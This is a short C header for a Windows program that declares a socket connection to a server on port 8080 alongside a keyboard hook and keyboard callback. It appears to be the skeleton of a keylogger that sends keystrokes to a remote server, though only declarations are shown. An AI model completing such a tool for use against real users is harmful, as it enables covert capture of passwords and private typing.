#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<WS2tcpip.h>
#include<WinSock2.h>
#include<string.h>
#include<memory.h>
#include<string.h>
#include<stdlib.h>
#include<io.h>
#include<stdbool.h>
#pragma warning(disable : 4996)
#pragma comment(lib, "ws2_32.lib")
#define SERV_LEN 256
#define HOST_LEN 256
#define DEFAULT_DATA 4
#define MAX 80
#define PORT 8080
#define MaxBufferSize 1024
int setsockettoserver();
void clean(int sockfd);
HWND hPwindow;
HHOOK keyboardhook;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);